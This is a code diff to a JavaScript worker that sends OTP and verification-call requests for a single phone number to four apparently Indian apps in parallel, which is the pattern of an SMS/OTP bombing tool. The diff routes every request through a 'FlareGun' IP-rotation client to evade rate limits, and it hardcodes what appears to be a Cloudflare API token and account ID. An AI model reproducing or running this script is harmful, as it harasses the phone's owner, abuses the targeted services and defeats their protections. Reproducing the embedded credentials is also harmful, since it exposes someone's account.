@@ -1,4 +1,14 @@
 // ========================
+// FlareGun — random IP rotation
+// ========================
+import { FlareGun } from "flaregun";
+
+const fg = new FlareGun({
+    apiToken: "cfut_W31OSTMgAystUij6nmPbfvvZPUtNliT2fdECQ1na535d537a",
+    accountId: "e4090ee1d3e9226b0fc137d95ad99a0d"
+});
+
+// ========================
 // Helper: random string
 // ========================
 function randomString(len = 8) {
@@ -17,7 +27,7 @@ async function sendPaisaCash(phone) {
     const clean = phone.replace(/\D/g, '');
     if (clean.length !== 10) throw new Error('10 digits required');
 
-    return await fetch('https://san.paisacashfin.com/pakh/fifth/protect/diet/stumble', {
+    return await fg.fetch('https://san.paisacashfin.com/pakh/fifth/protect/diet/stumble', {
         method: 'POST',
         headers: {
             'host': 'san.paisacashfin.com',
@@ -43,7 +53,7 @@ async function sendMatePaisa(phone) {
     const clean = phone.replace(/\D/g, '');
     if (clean.length !== 10) throw new Error('10 digits required');
 
-    return await fetch('https://gaeood-refaces.desisplit.com/nhcxs/qkirtt/gmthhn/rjbwl', {
+    return await fg.fetch('https://gaeood-refaces.desisplit.com/nhcxs/qkirtt/gmthhn/rjbwl', {
         method: 'POST',
         headers: {
             'user-agent': 'Dart/3.9 (dart:io)',
@@ -89,7 +99,7 @@ async function sendVelocity(phone) {
     };
 
     // Step A: create user
-    const createRes = await fetch('https://thor.velocity.in/api/v1/users/', {
+    const createRes = await fg.fetch('https://thor.velocity.in/api/v1/users/', {
         method: 'POST',
         headers,
         body: JSON.stringify({
@@ -117,7 +127,7 @@ async function sendVelocity(phone) {
     // Step B: auto resend OTP call
     let otpData = null;
     if (otpUuid) {
-        const otpRes = await fetch('https://thor.velocity.in/api/v1/users/resend_otp_call', {
+        const otpRes = await fg.fetch('https://thor.velocity.in/api/v1/users/resend_otp_call', {
             method: 'POST',
             headers,
             body: JSON.stringify({ otp_uuid: otpUuid })
@@ -140,7 +150,7 @@ async function sendBeato(phone) {
     const clean = phone.replace(/\D/g, '');
     if (clean.length !== 10) throw new Error('10 digits required');
 
-    return await fetch('https://api.beatoapp.com/v7/onboarding/generateotp', {
+    return await fg.fetch('https://api.beatoapp.com/v7/onboarding/generateotp', {
         method: 'POST',
         headers: {
             'host': 'api.beatoapp.com',
@@ -170,12 +180,10 @@ async function safe(name, fn, phone) {
     try {
         const r = await fn(phone);
 
-        // Velocity returns object with createUser
         if (r && r.createUser) {
             return { name, success: true, ...r };
         }
 
-        // Other APIs return Response
         const text = await r.text();
         let data;
         try { data = JSON.parse(text); } catch { data = text; }
@@ -207,7 +215,7 @@ export default {
             });
         }
 
-        // 🔥 4 APIs parallel
+        // 🔥 4 APIs parallel — har ek random IP se
         const results = await Promise.all([
             safe('paisacash', sendPaisaCash, clean),
             safe('matepaisa', sendMatePaisa, clean),
